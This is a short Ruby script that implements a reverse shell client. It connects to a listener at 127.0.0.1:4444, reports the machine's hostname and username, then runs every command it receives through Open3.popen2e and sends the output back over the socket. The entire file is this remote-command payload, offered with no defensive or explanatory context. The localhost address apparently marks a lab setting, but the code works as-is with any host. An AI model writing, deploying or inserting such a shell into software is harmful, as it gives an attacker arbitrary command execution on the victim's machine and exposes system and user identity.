require 'socket'
require 'open3'
def command_loop(s)
	loop {
		command = s.recv(1024)
		command = command.chomp
		exit if command == 'exit'
		stdin, stdout_and_stderr, wait_thr = Open3.popen2e("#{command}")
		s.print("#{stdout_and_stderr.readlines.join.chomp}\0")
	}
	rescue
		@s.puts("command does not exist\0")
		command_loop(@s) 
end
def connect_to_host()
	hostname = '127.0.0.1'
	port = 4444
	@s = TCPSocket.open(hostname, port)
	@s.print("#{Socket.gethostname}\\#{ENV["USERNAME"]}\0")
	command_loop(@s)
end
begin
	connect_to_host()
end
